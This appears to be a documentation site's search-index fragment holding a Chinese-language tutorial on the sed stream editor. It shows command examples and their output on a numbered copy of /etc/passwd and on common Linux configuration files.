//\u7b2c\u4e09\u884c\u4e0d\u5220\u9664\uff0c\u5176\u4ed6\u884c\u5220\u9664 \u4e0d\u52a0-i\u7b49\u4ef7\u4e8e\u6253\u5370\u7b2c3\u884c 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 3\uff09r \u8bfb\u53d6 [root@shell shelldoc]# sed '/root/r /etc/issue' pass 1 root:x:0:0:root:/root:/bin/bash Red Hat Enterprise Linux Server release 6.4 (Santiago) Kernel \\r on an \\m 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin 4\uff09w \u5199 [root@shell shelldoc]# sed '/root/w /tmp/douni' pass //\u5c06\u5339\u914d\u5230\u7684\u884c\u53e6\u5b58\u5230\u6587\u4ef6\u4e2d [root@shell shelldoc]# cat /tmp/douni 1 root:x:0:0:root:/root:/bin/bash 5\uff09a \u8ffd\u52a0 \u5728\u5339\u914d\u5230\u7684\u884c\u7684\u4e0b\u4e00\u884c\u63d2\u5165\u5185\u5bb9 [root@shell shelldoc]# sed '/root/a hello root' pass | head -5 1 root:x:0:0:root:/root:/bin/bash hello root 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin \u200b \u5728\u6587\u4ef6\u7684\u6700\u540e\u4e00\u884c\u63d2\u5165\u65b0\u5185\u5bb9 [root@shell shelldoc]# sed '$a The End' pass 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin The End 6\uff09i \u63d2\u5165 \u5728\u5339\u914d\u884c\u7684\u4e0a\u4e00\u884c\u63d2\u5165\u5185\u5bb9 [root@shell shelldoc]# sed '/daemon/i SO COOL' pass | head -5 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin SO COOL 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin [root@shell shelldoc]# sed '1i BEGINNING' pass | head -5 //\u5728\u7b2c\u4e00\u884c\u63d2\u5165\u5185\u5bb9 BEGINNING 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 7\uff09c \u4fee\u6539 \u672c\u884c\u66ff\u6362\uff0c\u5c06\u5339\u914d\u5230\u7684\u884c\u7684\u5185\u5bb9\u66ff\u6362\u6210\u65b0\u5185\u5bb9 [root@shell shelldoc]# sed '/root/c ROOT' pass ROOT 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [root@shell shelldoc]# sed '/IPADDR/c IPADDR=172.16.254.201' /etc/sysconfig/network-scripts/ifcfg-eth0 DEVICE=eth0 TYPE=Ethernet ONBOOT=yes NM_CONTROLLED=no BOOTPROTO=static IPADDR=172.16.254.201 NETMASK=255.255.0.0 GATEWAY=172.16.254.1 8\uff09y \u8f6c\u6362\u7684\u547d\u4ee4\uff0c\u5bf9\u5e94\u66ff\u6362 [root@shell shelldoc]# sed 'y/1234/ABCF/' pass A root:x:0:0:root:/root:/bin/bash B bin:x:A:A:bin:/bin:/sbin/nologin C daemon:x:B:B:daemon:/sbin:/sbin/nologin F adm:x:C:F:adm:/var/adm:/sbin/nologin 5 lp:x:F:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:AB:mail:/var/spool/mail:/sbin/nologin A0 uucp:x:A0:AF:uucp:/var/spool/uucp:/sbin/nologin \u200b \u5c06\u6587\u4ef6\u4e2d\u6240\u6709\u7684\u5c0f\u5199\u5b57\u6bcd\u8f6c\u6362\u6210\u5927\u5199\u5b57\u6bcd [root@shell shelldoc]# sed 'y/qwertyuiopasdfghjklzxcvbnm/QWERTYUIOPASDFGHJKLZXCVBNM/' pass 9\uff09n next \u5904\u7406\u5339\u914d\u884c\u7684\u4e0b\u4e00\u884c\uff0c\u7528\u7684\u8f83\u5c11 [root@shell shelldoc]# sed -n '/root/p' pass 1 root:x:0:0:root:/root:/bin/bash [root@shell shelldoc]# sed -n '/root/{n;p}' pass //{}\u91cc\u9762\u5199\u591a\u4e2a\u547d\u4ee4\uff0c\u4e4b\u95f4\u7528\u5206\u53f7\u5206\u9694 2 bin:x:1:1:bin:/bin:/sbin/nologin [root@iZbp1ealzv6zqhd71bns8sZ ~]# sed '1{n;d}' passwd //\u5bf9\u7b2c\u4e00\u884c\u7684\u4e0b\u4e00\u884c\u6267\u884c\u5220\u9664\u52a8\u4f5c 1 root:x:0:0:root:/root:/bin/bash 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin \u200b N \u8ffd\u52a0\u4e0b\u4e00\u884c [root@iZbp1ealzv6zqhd71bns8sZ ~]# sed '1{N;d}' passwd //\u5728\u7b2c\u4e00\u884c\u7684\u57fa\u7840\u4e0a\uff0c\u5728\u8ffd\u52a0\u4e00\u884c\uff0c\u518d\u5220\u9664 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 10\uff09q \u9000\u51fa \u4e0d\u518d\u5411\u6a21\u5f0f\u7a7a\u95f4\u8bfb\u5165\u65b0\u884c [root@shell shelldoc]# sed '/^bin/q' /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin [root@shell shelldoc]# sed '1q' pass //head -1\u7684\u53c8\u4e00\u79cd\u65b9\u6cd5 1 root:x:0:0:root:/root:/bin/bash 11\uff09s \u67e5\u627e\u66ff\u6362 \u5b9a\u5740s/\u6a21\u5f0f\u5339\u914d(\u65e7\u7684\u5185\u5bb9)/\u65b0\u7684\u5185\u5bb9/[\u4fee\u9970\u7b26] s@@@ s### s%%% \u4fee\u9970\u7b26\uff1a g\uff1a\u5168\u5c40\u66ff\u6362\uff0c\u4e00\u884c\u4e2d\u7684\u591a\u4e2a n\uff1an\u4e3a\u6570\u5b57\uff0c1-512 \u66ff\u6362\u7b2cn\u4e2a\u5339\u914d\u5230\u7684\u5185\u5bb9 p\uff1a\u6253\u5370 w\uff1a\u53e6\u5b58\u4e3a\uff0c\u5199 [root@shell shelldoc]# sed 's/root/ROOT/' pass | head -3 //\u9ed8\u8ba4\u53ea\u66ff\u6362\u7b2c\u4e00\u6b21\u5339\u914d\u5230\u7684 1 ROOT:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin [root@shell shelldoc]# sed 's/root/ROOT/2' pass | head -3 //\u66ff\u6362\u6bcf\u884c\u4e2d\u7b2c2\u4e2a\u5339\u914d\u5230\u7684 1 root:x:0:0:ROOT:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin [root@shell shelldoc]# sed 's/root/ROOT/g' pass | head -3 //\u5168\u90e8\u66ff\u6362 1 ROOT:x:0:0:ROOT:/ROOT:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat /etc/passwd | head -n 2 | sed -e 's/root/yinzhipeng/g' -e 's/bin/uuu/g' //\u591a\u91cd\u66ff\u6362 yinzhipeng:x:0:0:yinzhipeng:/yinzhipeng:/uuu/bash uuu:x:1:1:uuu:/uuu:/suuu/nologin \u5220\u9664\u6587\u4ef6\u4e2d\u6240\u6709\u7684\u6570\u5b57 [root@shell shelldoc]# sed 's/[0-9]//g' pass \u6a21\u5f0f\u5339\u914d\u65f6\u7684\u7279\u6b8a\u7b26\u53f7 ^\uff1a\u6bcf\u884c\u7684\u5f00\u5934 \u7ed9\u5168\u6587\u52a0\u6ce8\u91ca [root@shell shelldoc]# sed 's/^/#/' pass \u5728\u7b2c8\u523010\u884c\u7684\u5f00\u5934\u6bcf\u884c\u52a0\u4e0a### [root@shell shelldoc]# sed '8,10s/^/###/' pass $\uff1a\u6bcf\u884c\u7684\u7ed3\u5c3e \u5728\u5339\u914d\u5230root\u7684\u884c\u7684\u672b\u5c3e\u6dfb\u52a0### [root@shell shelldoc]# sed '/root/s/$/###/' pass 1 root:x:0:0:root:/root:/bin/bash### &\uff1a\u5f15\u7528 \u7528\u6765\u4ee3\u66ff\u5339\u914d\u5230\u7684\u6a21\u5f0f\u7684 \u5c06\u6bcf\u4e00\u884c\u7684\u884c\u53f7\u52a0\u4e0a\u62ec\u53f7 [root@shell shelldoc]# sed -r 's/[0-9]+/(&)/' pass [root@shell shelldoc]# cat vtest hello, i like you hi, my love like ==> liker love ==> lover [root@shell shelldoc]# sed 's/l..e/&r/' test hello, i liker you hi, my lover [root@shell shelldoc]# sed -r 's/(l..e)/\\1r/' test hello, i liker you hi, my lover like ==> Like love ==> Love [root@shell shelldoc]# sed -r 's/l(..e)/L\\1/' test hello, i Like you hi, my Love \u200b \u6bcf\u591a\u5c11\u884c\u64cd\u4f5c\u4e00\u6b21 \u200b first~step \u200b first\uff1a\u8d77\u59cb\u884c\u53f7 \u200b step\uff1a\u6b65\u957f \u200b \u6253\u5370\u5076\u6570\u884c [root@shell shelldoc]# sed -n '2~2p' pass 2 bin:x:1:1:bin:/bin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 8 halt:x:7:0:halt:/sbin:/sbin/halt 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin \u200b \u6bcf3\u884c\u6253\u5370\u4e00\u6b21 [root@shell shelldoc]# sed -n '1~3p' pass 1 root:x:0:0:root:/root:/bin/bash 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin \u200b = \u6253\u5370\u5f53\u524d\u884c\u884c\u53f7 [root@shell shelldoc]# wc -l pass 10 pass \u6253\u5370\u6587\u4ef6\u7684\u884c\u6570 [root@shell shelldoc]# wc -l pass | cut -d\" \" -f1 10 [root@shell shelldoc]# sed -n '$=' pass 10","title":"\u8bed\u6cd5"},{"location":"programming_language/bash_help/sed/sed/#sed","text":"\u6d41\u7f16\u8f91\u5668 stream editor \u662f\u4e00\u79cd\u975e\u4ea4\u4e92\u5f0f\u6587\u672c\u7f16\u8f91\u5668\uff0c\u9ed8\u8ba4\u662f\u4e0d\u4f1a\u4fee\u6539\u539f\u6587\u4ef6\u7684 \u5de5\u4f5c\u539f\u7406\uff1a \u4e00\u884c\u4e00\u884c\u5904\u7406\uff0c\u4ece\u6587\u4ef6\u7684\u7b2c\u4e00\u884c\u5f00\u59cb\u8bfb\u53d6\uff0c\u653e\u5230\u6a21\u5f0f\u7a7a\u95f4\u4e2d\u8fdb\u884c\u76f8\u5e94\u5904\u7406\uff0c\u5904\u7406\u5b8c\u5c06\u7ed3\u679c\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a\uff0c\u7136\u540e\u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u884c\uff0c\u76f4\u5230\u6240\u6709\u7684\u884c\u90fd\u5904\u7406\u5b8c\u6bd5\uff0csed\u7ed3\u675f\u3002 \u8bed\u6cd5\uff1a sed [\u9009\u9879] 'AddressCommand' \u6587\u4ef6\u5217\u8868","title":"sed"},{"location":"programming_language/bash_help/sed/sed/#1","text":"-n\uff1a\u9759\u9ed8\u8f93\u51fa\uff0c\u5173\u95ed\u6a21\u5f0f\u7a7a\u95f4\u7684\u8f93\u51fa\uff0c\u4e00\u822c\u4e0ep\u4e00\u8d77\u7528 -e\uff1a\u5141\u8bb8\u8fdb\u884c\u591a\u9879\u7f16\u8f91\uff0c\u4e5f\u5c31\u662f\u8bf4\u5bf9\u540c\u4e00\u884c\u505a\u591a\u6b21\u5904\u7406\u3001\u4e5f\u53ef\u4ee5\u505a\u591a\u70b9\u7f16\u8f91 -e '\u52a8\u4f5c' -e '\u52a8\u4f5c' \u7b49\u4ef7\u4e8e '\u52a8\u4f5c1;\u52a8\u4f5c2' \u4e5f\u53ef\u4ee5{\u52a8\u4f5c1;\u52a8\u4f5c2} -f\uff1ased\u811a\u672c\uff1a\u6307\u5b9a\u8fd0\u884c\u7684sed\u811a\u672c\u7684 -r\uff1a\u5141\u8bb8\u4f7f\u7528\u6269\u5c55\u6b63\u5219 [root@shell shelldoc]# sed -r 's/[0-9]+//' pass -i\uff1a\u76f4\u63a5\u4fee\u6539\u539f\u6587\u4ef6 -i.\u540e\u7f00\u540d\uff1a\u5728\u4fee\u6539\u4e4b\u524d\u5148\u5907\u4efd -i.bak [root@shell shelldoc]# sed -i '/SELINUX/s/disabled/permissive/' /etc/selinux/config [root@shell shelldoc]# cat /etc/selinux/config # This file controls the state of SELinux on the system. # SELINUX= can take one of these three values: # enforcing - SELinux security policy is enforced. # permissive - SELinux prints warnings instead of enforcing. # disabled - No SELinux policy is loaded. SELINUX=permissive # SELINUXTYPE= can take one of these two values: # targeted - Targeted processes are protected, # mls - Multi Level Security protection. SELINUXTYPE=targeted \u5728\u4fee\u6539\u6587\u4ef6\u4e4b\u524d\u5148\u5907\u4efd [root@shell shelldoc]# sed -i.bak '/SELINUX/s/permissive/disabled/' /etc/selinux/config [root@shell shelldoc]# ls /etc/selinux/config* /etc/selinux/config /etc/selinux/config.bak [root@shell shelldoc]# cat /etc/selinux/config # This file controls the state of SELinux on the system. # SELINUX= can take one of these three values: # enforcing - SELinux security policy is enforced. # permissive - SELinux prints warnings instead of enforcing. # disabled - No SELinux policy is loaded. SELINUX=disabled # SELINUXTYPE= can take one of these two values: # targeted - Targeted processes are protected, # mls - Multi Level Security protection. SELINUXTYPE=targeted","title":"1\u3001\u5e38\u7528\u7684\u9009\u9879"},{"location":"programming_language/bash_help/sed/sed/#2address","text":"","title":"2\u3001Address \uff1a  \u5b9a\u5740\u3001\u5730\u5740"},{"location":"programming_language/bash_help/sed/sed/#1_1","text":"\u200b \u5982\uff1a1 \u5c31\u8868\u793a\u8981\u5904\u7406\u7b2c\u4e00\u884c \u200b $ \u8868\u793a\u6700\u540e\u4e00\u884c","title":"1\uff09\u5355\u72ec\u7684\u884c\u53f7"},{"location":"programming_language/bash_help/sed/sed/#2","text":"\u200b \u5982\uff1a 1,5 \u5904\u7406\u7b2c\u4e00\u884c\u5230\u7b2c\u4e94\u884c","title":"2\uff09\u8d77\u59cb\u884c,\u7ed3\u675f\u884c"},{"location":"programming_language/bash_help/sed/sed/#3","text":"\u200b \u5982\uff1a/^root/ \u5904\u7406\u4ee5root\u5f00\u5934\u7684\u884c","title":"3\uff09/\u6b63\u5219\u8868\u8fbe\u5f0f/"},{"location":"programming_language/bash_help/sed/sed/#412","text":"\u200b \u8868\u793a\u5904\u7406\u4ece\u5339\u914d\u5230\u6b63\u5219\u8868\u8fbe\u5f0f1\u7684\u884c\u5f00\u59cb\uff0c\u5230\u7b2c\u4e00\u6b21\u5339\u914d\u5230\u6b63\u5219\u8868\u8fbe\u5f0f2\u4e4b\u95f4\u7684\u6240\u6709\u884c \u200b \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f1\u5339\u914d\u5230\u4e86\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f2\u672a\u5339\u914d\u5230\uff0c\u90a3\u4e48\u5c31\u4ece\u5339\u914d\u5230\u6b63\u5219\u8868\u8fbe\u5f0f1\u7684\u884c\u5f00\u59cb\uff0c\u4e00\u76f4\u5904\u7406\u5230\u6587\u4ef6\u7ed3\u675f \u200b \u5982\u679c\u6b63\u5219\u8868\u8fbe\u5f0f1\u672a\u5339\u914d\u5230\uff0c\u90a3\u4e48\u5c31\u4e0d\u5bf9\u6587\u4ef6\u505a\u5904\u7406\u3002 \u5982\uff1a/^bin/,/bash$/ binsdadaddaddass dsfasidsfdhfj09bash dasdasdasdf--bash","title":"4\uff09/\u6b63\u5219\u8868\u8fbe\u5f0f1/\uff0c/\u6b63\u5219\u8868\u8fbe\u5f0f2/        \u6700\u5c0f\u5339\u914d"},{"location":"programming_language/bash_help/sed/sed/#5n","text":"\u200b \u8868\u793a\u4ece\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\uff0c\u540e\u9762\u7684N\u884c\u90fd\u5904\u7406 \u200b \u5982\uff1a3,+5 \u5904\u74063-8\u884c","title":"5\uff09\u8d77\u59cb\u4f4d\u7f6e\uff0c+N     \u4e0d\u662f\u7279\u522b\u5e38\u7528"},{"location":"programming_language/bash_help/sed/sed/#6sed","text":"","title":"6\uff09sed\u7684\u5206\u7ec4\u547d\u4ee4\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e2a\u5730\u5740\u5d4c\u5957\u53e6\u4e00\u4e2a\u5730\u5740\u4e2d"},{"location":"programming_language/bash_help/sed/sed/#3_1","text":"\u5e38\u7528\u7684\uff1ad p s y q \u5176\u4ed6\u7684\uff1aa c i r w \u200b h H g G","title":"3\u3001\u547d\u4ee4"},{"location":"programming_language/bash_help/sed/sed/#1d","text":"[root@shell shelldoc]# sed '/UUID/d' /etc/fstab [root@shell shelldoc]# sed '1,5d' /etc/fstab [root@shell shelldoc]# sed '$d' /etc/fstab [root@shell shelldoc]# sed '/tmp/,/sfs/d' /etc/fstab [root@shell shelldoc]# sed '/UUID/,+5d' /etc/fstab \u5220\u9664\u4ece\u7b2c5\u884c\u5f00\u59cb\u5230\u6700\u540e\u4e00\u884c\u7684\u6240\u6709\u5185\u5bb9 [root@shell shelldoc]# sed '5,$d' /etc/passwd","title":"1\uff09d\uff1a\u5220\u9664"},{"location":"programming_language/bash_help/sed/sed/#2p","text":"[root@shell shelldoc]# cat -n /etc/passwd | head > pass [root@shell shelldoc]# sed 'p' pass //\u6bcf\u884c\u4f1a\u6253\u5370\u4e24\u904d\uff0c\u4e00\u904d\u662f\u5904\u7406\u7ed3\u679c\uff0c\u4e00\u904d\u662f\u6a21\u5f0f\u7a7a\u95f4\u7684\u8f93\u51fa [root@shell shelldoc]# sed -n 'p' pass //\u53ea\u4f1a\u6253\u5370\u4e00\u904d\uff0c\u56e0\u4e3a\u6a21\u5f0f\u7a7a\u95f4\u7684\u8f93\u51fa\u88ab\u5173\u95ed\u4e86 [root@shell shelldoc]# sed -n '3,5p' pass // \u6253\u5370\u6587\u4ef6\u76843\u52305\u884c 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [root@shell shelldoc]# sed -n '3p' pass 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin \u200b ! \u975e [root@shell shelldoc]# sed '3!d' pass //\u7b2c\u4e09\u884c\u4e0d\u5220\u9664\uff0c\u5176\u4ed6\u884c\u5220\u9664 \u4e0d\u52a0-i\u7b49\u4ef7\u4e8e\u6253\u5370\u7b2c3\u884c 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin","title":"2\uff09p\uff1a\u6253\u5370"},{"location":"programming_language/bash_help/sed/sed/#3r","text":"[root@shell shelldoc]# sed '/root/r /etc/issue' pass 1 root:x:0:0:root:/root:/bin/bash Red Hat Enterprise Linux Server release 6.4 (Santiago) Kernel \\r on an \\m 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin","title":"3\uff09r   \u8bfb\u53d6"},{"location":"programming_language/bash_help/sed/sed/#4w","text":"[root@shell shelldoc]# sed '/root/w /tmp/douni' pass //\u5c06\u5339\u914d\u5230\u7684\u884c\u53e6\u5b58\u5230\u6587\u4ef6\u4e2d [root@shell shelldoc]# cat /tmp/douni 1 root:x:0:0:root:/root:/bin/bash","title":"4\uff09w \u5199"},{"location":"programming_language/bash_help/sed/sed/#5a","text":"[root@shell shelldoc]# sed '/root/a hello root' pass | head -5 1 root:x:0:0:root:/root:/bin/bash hello root 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin \u200b \u5728\u6587\u4ef6\u7684\u6700\u540e\u4e00\u884c\u63d2\u5165\u65b0\u5185\u5bb9 [root@shell shelldoc]# sed '$a The End' pass 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin 10 uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin The End","title":"5\uff09a   \u8ffd\u52a0   \u5728\u5339\u914d\u5230\u7684\u884c\u7684\u4e0b\u4e00\u884c\u63d2\u5165\u5185\u5bb9"},{"location":"programming_language/bash_help/sed/sed/#6i","text":"[root@shell shelldoc]# sed '/daemon/i SO COOL' pass | head -5 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin SO COOL 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin [root@shell shelldoc]# sed '1i BEGINNING' pass | head -5 //\u5728\u7b2c\u4e00\u884c\u63d2\u5165\u5185\u5bb9 BEGINNING 1 root:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin","title":"6\uff09i  \u63d2\u5165     \u5728\u5339\u914d\u884c\u7684\u4e0a\u4e00\u884c\u63d2\u5165\u5185\u5bb9"},{"location":"programming_language/bash_help/sed/sed/#7c","text":"[root@shell shelldoc]# sed '/root/c ROOT' pass ROOT 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin 5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin [root@shell shelldoc]# sed '/IPADDR/c IPADDR=172.16.254.201' /etc/sysconfig/network-scripts/ifcfg-eth0 DEVICE=eth0 TYPE=Ethernet ONBOOT=yes NM_CONTROLLED=no BOOTPROTO=static IPADDR=172.16.254.201 NETMASK=255.255.0.0 GATEWAY=172.16.254.1","title":"7\uff09c  \u4fee\u6539       \u672c\u884c\u66ff\u6362\uff0c\u5c06\u5339\u914d\u5230\u7684\u884c\u7684\u5185\u5bb9\u66ff\u6362\u6210\u65b0\u5185\u5bb9"},{"location":"programming_language/bash_help/sed/sed/#8y","text":"[root@shell shelldoc]# sed 'y/1234/ABCF/' pass A root:x:0:0:root:/root:/bin/bash B bin:x:A:A:bin:/bin:/sbin/nologin C daemon:x:B:B:daemon:/sbin:/sbin/nologin F adm:x:C:F:adm:/var/adm:/sbin/nologin 5 lp:x:F:7:lp:/var/spool/lpd:/sbin/nologin 6 sync:x:5:0:sync:/sbin:/bin/sync 7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 8 halt:x:7:0:halt:/sbin:/sbin/halt 9 mail:x:8:AB:mail:/var/spool/mail:/sbin/nologin A0 uucp:x:A0:AF:uucp:/var/spool/uucp:/sbin/nologin \u200b \u5c06\u6587\u4ef6\u4e2d\u6240\u6709\u7684\u5c0f\u5199\u5b57\u6bcd\u8f6c\u6362\u6210\u5927\u5199\u5b57\u6bcd [root@shell shelldoc]# sed 'y/qwertyuiopasdfghjklzxcvbnm/QWERTYUIOPASDFGHJKLZXCVBNM/' pass","title":"8\uff09y      \u8f6c\u6362\u7684\u547d\u4ee4\uff0c\u5bf9\u5e94\u66ff\u6362"},{"location":"programming_language/bash_help/sed/sed/#9n-next","text":"[root@shell shelldoc]# sed -n '/root/p' pass 1 root:x:0:0:root:/root:/bin/bash [root@shell shelldoc]# sed -n '/root/{n;p}' pass //{}\u91cc\u9762\u5199\u591a\u4e2a\u547d\u4ee4\uff0c\u4e4b\u95f4\u7528\u5206\u53f7\u5206\u9694 2 bin:x:1:1:bin:/bin:/sbin/nologin [root@iZbp1ealzv6zqhd71bns8sZ ~]# sed '1{n;d}' passwd //\u5bf9\u7b2c\u4e00\u884c\u7684\u4e0b\u4e00\u884c\u6267\u884c\u5220\u9664\u52a8\u4f5c 1 root:x:0:0:root:/root:/bin/bash 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin \u200b N \u8ffd\u52a0\u4e0b\u4e00\u884c [root@iZbp1ealzv6zqhd71bns8sZ ~]# sed '1{N;d}' passwd //\u5728\u7b2c\u4e00\u884c\u7684\u57fa\u7840\u4e0a\uff0c\u5728\u8ffd\u52a0\u4e00\u884c\uff0c\u518d\u5220\u9664 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin 4 adm:x:3:4:adm:/var/adm:/sbin/nologin","title":"9\uff09n     next     \u5904\u7406\u5339\u914d\u884c\u7684\u4e0b\u4e00\u884c\uff0c\u7528\u7684\u8f83\u5c11"},{"location":"programming_language/bash_help/sed/sed/#10q","text":"[root@shell shelldoc]# sed '/^bin/q' /etc/passwd root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin [root@shell shelldoc]# sed '1q' pass //head -1\u7684\u53c8\u4e00\u79cd\u65b9\u6cd5 1 root:x:0:0:root:/root:/bin/bash","title":"10\uff09q   \u9000\u51fa       \u4e0d\u518d\u5411\u6a21\u5f0f\u7a7a\u95f4\u8bfb\u5165\u65b0\u884c"},{"location":"programming_language/bash_help/sed/sed/#11s","text":"\u5b9a\u5740s/\u6a21\u5f0f\u5339\u914d(\u65e7\u7684\u5185\u5bb9)/\u65b0\u7684\u5185\u5bb9/[\u4fee\u9970\u7b26] s@@@ s### s%%% \u4fee\u9970\u7b26\uff1a g\uff1a\u5168\u5c40\u66ff\u6362\uff0c\u4e00\u884c\u4e2d\u7684\u591a\u4e2a n\uff1an\u4e3a\u6570\u5b57\uff0c1-512 \u66ff\u6362\u7b2cn\u4e2a\u5339\u914d\u5230\u7684\u5185\u5bb9 p\uff1a\u6253\u5370 w\uff1a\u53e6\u5b58\u4e3a\uff0c\u5199 [root@shell shelldoc]# sed 's/root/ROOT/' pass | head -3 //\u9ed8\u8ba4\u53ea\u66ff\u6362\u7b2c\u4e00\u6b21\u5339\u914d\u5230\u7684 1 ROOT:x:0:0:root:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin [root@shell shelldoc]# sed 's/root/ROOT/2' pass | head -3 //\u66ff\u6362\u6bcf\u884c\u4e2d\u7b2c2\u4e2a\u5339\u914d\u5230\u7684 1 root:x:0:0:ROOT:/root:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin [root@shell shelldoc]# sed 's/root/ROOT/g' pass | head -3 //\u5168\u90e8\u66ff\u6362 1 ROOT:x:0:0:ROOT:/ROOT:/bin/bash 2 bin:x:1:1:bin:/bin:/sbin/nologin 3 daemon:x:2:2:daemon:/sbin:/sbin/nologin [root@iZbp1ealzv6zqhd71bns8sZ ~]# cat /etc/passwd | head -n 2 | sed -e 's/root/yinzhipeng/g' -e 's/bin/uuu/g' //\u591a\u91cd\u66ff\u6362 yinzhipeng:x:0:0:yinzhipeng:/yinzhipeng:/uuu/bash uuu:x:1:1:uuu:/uuu:/suuu/nologin \u5220\u9664\u6587\u4ef6\u4e2d\u6240\u6709\u7684\u6570\u5b57 [root@shell shelldoc]# sed 's/[0-9]//g' pass 